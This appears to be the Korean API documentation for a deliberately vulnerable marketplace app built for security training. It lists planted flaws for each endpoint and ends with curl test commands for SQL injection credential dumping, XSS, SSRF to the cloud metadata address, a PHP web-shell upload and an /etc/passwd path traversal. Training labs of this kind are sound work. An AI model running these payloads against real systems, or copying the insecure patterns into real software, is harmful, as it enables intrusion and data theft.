# 📡 Vintage Market API 문서

## 개요
Vintage Market 플랫폼의 RESTful API 문서입니다. 이 API는 **교육 목적으로 의도적인 보안 취약점**을 포함하고 있습니다.

**⚠️ 경고**: 실제 프로덕션 환경에서는 사용하지 마세요!

---

## 🌐 기본 정보

- **Base URL**: `http://localhost:5000/api`
- **Content-Type**: `application/json`
- **Authentication**: JWT Bearer Token (취약한 구현)

---

## 🔐 인증 (Authentication)

### POST /api/auth/register
사용자 회원가입

**Request Body**:
```json
{
  "username": "testuser",
  "email": "test@example.com",
  "password": "password123",
  "full_name": "Test User",
  "phone": "010-1234-5678"
}
```

**Response**:
```json
{
  "success": true,
  "message": "User registered successfully",
  "user": {
    "id": 1,
    "username": "testuser",
    "email": "test@example.com"
  }
}
```

**취약점**: 
- 약한 패스워드 정책
- 이메일 인증 없이 계정 생성
- 사용자 정보 과다 노출

### POST /api/auth/login
사용자 로그인

**Request Body**:
```json
{
  "username": "testuser",
  "password": "password123"
}
```

**Response**:
```json
{
  "success": true,
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...",
  "user": {
    "id": 1,
    "username": "testuser",
    "is_admin": false
  }
}
```

**취약점**:
- SQL Injection 가능 (`username=' OR 1=1 --`)
- JWT 시크릿이 약함
- 로그인 시도 제한 없음

### POST /api/auth/logout
사용자 로그아웃

**Headers**:
```
Authorization: Bearer <token>
```

---

## 👤 사용자 관리 (Users)

### GET /api/users/profile
사용자 프로필 조회

**Headers**:
```
Authorization: Bearer <token>
```

**Response**:
```json
{
  "id": 1,
  "username": "testuser",
  "email": "test@example.com",
  "full_name": "Test User",
  "phone": "010-1234-5678",
  "balance": 1000.00,
  "ssn": "123-45-6789",
  "credit_card": "1234-5678-9012-3456"
}
```

**취약점**:
- 민감한 정보 (주민등록번호, 신용카드) 평문 노출
- IDOR 취약점 가능

### PUT /api/users/profile
사용자 프로필 수정

**Request Body**:
```json
{
  "full_name": "Updated Name",
  "phone": "010-9876-5432",
  "address": "New Address"
}
```

**취약점**:
- 입력 검증 부족
- XSS 가능한 필드들

### GET /api/users/{id}
특정 사용자 정보 조회

**취약점**:
- IDOR (Insecure Direct Object References)
- 권한 검증 없이 다른 사용자 정보 접근 가능

---

## 🛍️ 상품 관리 (Products)

### GET /api/products
상품 목록 조회

**Query Parameters**:
- `category` - 카테고리 필터
- `search` - 검색어
- `page` - 페이지 번호
- `limit` - 페이지당 항목 수

**Example**: `/api/products?search=laptop&category=electronics`

**Response**:
```json
{
  "products": [
    {
      "id": 1,
      "title": "MacBook Pro",
      "description": "중고 맥북프로 판매합니다",
      "price": 1500000,
      "category": "electronics",
      "seller_id": 2,
      "seller_name": "seller1",
      "images": ["image1.jpg", "image2.jpg"],
      "created_at": "2023-12-01T10:00:00Z"
    }
  ],
  "total": 1,
  "page": 1,
  "totalPages": 1
}
```

**취약점**:
- SQL Injection 가능 (`search=' OR 1=1 --`)
- NoSQL Injection (MongoDB 연동시)

### POST /api/products
상품 등록

**Headers**:
```
Authorization: Bearer <token>
Content-Type: multipart/form-data
```

**Request Body** (FormData):
```
title: "New Product"
description: "상품 설명"
price: 100000
category: "electronics"
images: [File, File]
```

**취약점**:
- 파일 업로드 제한 없음
- XSS 가능한 제목/설명 필드
- 가격 조작 가능

### GET /api/products/{id}
특정 상품 상세 조회

**Response**:
```json
{
  "id": 1,
  "title": "MacBook Pro",
  "description": "<script>alert('XSS')</script>",
  "price": 1500000,
  "original_price": 2000000,
  "discount_code": "SECRET20",
  "seller": {
    "id": 2,
    "username": "seller1"
  }
}
```

**취약점**:
- XSS 가능한 description 필드
- 민감한 정보 노출 (original_price, discount_code)

---

## 💬 댓글 시스템 (Comments)

### GET /api/products/{id}/comments
상품 댓글 목록

**Response**:
```json
{
  "comments": [
    {
      "id": 1,
      "content": "<img src=x onerror=alert('XSS')>",
      "user_id": 3,
      "username": "buyer1",
      "created_at": "2023-12-01T11:00:00Z"
    }
  ]
}
```

**취약점**:
- Stored XSS (댓글 내용 필터링 없음)
- HTML 태그 허용

### POST /api/products/{id}/comments
댓글 작성

**Request Body**:
```json
{
  "content": "좋은 상품이네요! <script>alert('XSS')</script>"
}
```

**취약점**:
- XSS 페이로드 저장 가능
- CSRF 보호 없음

---

## 💰 거래 시스템 (Transactions)

### POST /api/transactions
상품 구매

**Request Body**:
```json
{
  "product_id": 1,
  "quantity": 1,
  "price": 1500000,
  "shipping_address": "서울시 강남구...",
  "payment_method": "card"
}
```

**취약점**:
- 클라이언트에서 가격 조작 가능
- Race Condition (동시 구매 시 재고 문제)

### GET /api/transactions
거래 내역 조회

**Response**:
```json
{
  "transactions": [
    {
      "id": 1,
      "product_id": 1,
      "buyer_id": 3,
      "seller_id": 2,
      "amount": -100,
      "status": "completed",
      "admin_override": true
    }
  ]
}
```

**취약점**:
- 음수 금액 거래 가능
- 관리자 오버라이드 플래그 노출

---

## 💳 쿠폰 시스템 (Coupons)

### POST /api/coupons/apply
쿠폰 적용

**Request Body**:
```json
{
  "code": "WELCOME10",
  "product_id": 1
}
```

**Response**:
```json
{
  "success": true,
  "discount": 10000,
  "final_price": 90000
}
```

**취약점**:
- 쿠폰 사용 횟수 제한 우회 가능
- 만료된 쿠폰 사용 가능
- Race Condition

---

## 📁 파일 업로드 (Upload)

### POST /api/upload
파일 업로드

**Headers**:
```
Content-Type: multipart/form-data
```

**Request Body**:
```
file: [File]
type: "profile" | "product" | "chat"
```

**Response**:
```json
{
  "success": true,
  "filename": "uploaded_file.jpg",
  "path": "/uploads/uploaded_file.jpg",
  "size": 1024000
}
```

**취약점**:
- 파일 타입 검증 없음
- 파일 크기 제한 없음
- 실행 가능한 파일 업로드 허용
- Path Traversal 가능

### GET /api/uploads/{filename}
업로드된 파일 접근

**취약점**:
- 직접 파일 시스템 접근
- 디렉토리 리스팅 가능
- Path Traversal (`../../../etc/passwd`)

---

## 💬 실시간 채팅 (Chat)

### WebSocket: /socket.io/
실시간 채팅 연결

**이벤트들**:
- `join_room` - 채팅방 참여
- `send_message` - 메시지 전송
- `receive_message` - 메시지 수신

**취약점**:
- 인증 없이 모든 채팅방 접근 가능
- 메시지 암호화 없음
- XSS 가능한 메시지

---

## 🔍 검색 기능 (Search)

### GET /api/search
통합 검색

**Query Parameters**:
- `q` - 검색어
- `type` - 검색 타입 (products, users)

**Response**:
```json
{
  "query": "<script>alert('XSS')</script>",
  "results": {
    "products": [],
    "users": []
  }
}
```

**취약점**:
- Reflected XSS (검색어가 그대로 반환)
- SQL Injection 가능

---

## 🌐 외부 서비스 연동

### POST /api/image/fetch
외부 이미지 가져오기

**Request Body**:
```json
{
  "url": "http://example.com/image.jpg"
}
```

**취약점**:
- SSRF (Server-Side Request Forgery)
- 내부 네트워크 접근 가능
- 임의 프로토콜 지원 (file://, ftp:// 등)

---

## 📊 관리자 기능 (Admin)

### GET /api/admin/users
모든 사용자 조회 (관리자용)

**취약점**:
- 권한 검증 우회 가능
- 민감한 정보 대량 노출

### POST /api/admin/users/{id}/role
사용자 권한 변경

**취약점**:
- 권한 상승 가능
- IDOR 취약점

---

## 🚨 에러 응답

### 일반적인 에러 형식
```json
{
  "success": false,
  "error": "Database connection failed",
  "details": {
    "stack": "Error: connection refused\n    at Database.connect (/app/db.js:45:12)",
    "query": "SELECT * FROM users WHERE id = '1' OR 1=1 --'",
    "file": "/app/controllers/userController.js",
    "line": 23
  }
}
```

**취약점**:
- 상세한 스택 트레이스 노출
- 데이터베이스 쿼리 노출
- 파일 경로 및 라인 번호 노출

---

## 🧪 보안 테스트 예제

### SQL Injection 테스트
```bash
# 로그인 우회
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\''--","password":"anything"}'

# 검색에서 데이터 추출
curl "http://localhost:5000/api/products?search=' UNION SELECT 1,username,password,4,5,6,7 FROM users --"
```

### XSS 테스트
```bash
# Stored XSS (댓글)
curl -X POST http://localhost:5000/api/products/1/comments \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <token>" \
  -d '{"content":"<script>alert('\''XSS'\'')</script>"}'

# Reflected XSS (검색)
curl "http://localhost:5000/api/search?q=<script>alert('XSS')</script>"
```

### SSRF 테스트
```bash
# 내부 메타데이터 접근
curl -X POST http://localhost:5000/api/image/fetch \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'

# 로컬 포트 스캔
curl -X POST http://localhost:5000/api/image/fetch \
  -H "Content-Type: application/json" \
  -d '{"url":"http://localhost:3306/"}'
```

### 파일 업로드 테스트
```bash
# PHP 웹쉘 업로드
echo '<?php system($_GET["cmd"]); ?>' > shell.php
curl -X POST http://localhost:5000/api/upload \
  -F "file=@shell.php" \
  -F "type=profile"

# Path Traversal
curl "http://localhost:5000/api/uploads/../../../etc/passwd"
```

---

## 📋 보안 체크리스트

실습 후 다음 항목들을 점검하여 취약점 이해도를 확인하세요:

- [ ] SQL Injection 공격 성공 여부
- [ ] XSS 페이로드 실행 확인
- [ ] SSRF를 통한 내부 서비스 접근
- [ ] 파일 업로드를 통한 웹쉘 설치
- [ ] 권한 상승 공격 시도
- [ ] 민감한 정보 노출 확인
- [ ] 비즈니스 로직 우회 시도

각 취약점에 대한 자세한 실습 방법은 [`/security/VULNERABILITIES.md`](../security/VULNERABILITIES.md)를 참조하세요.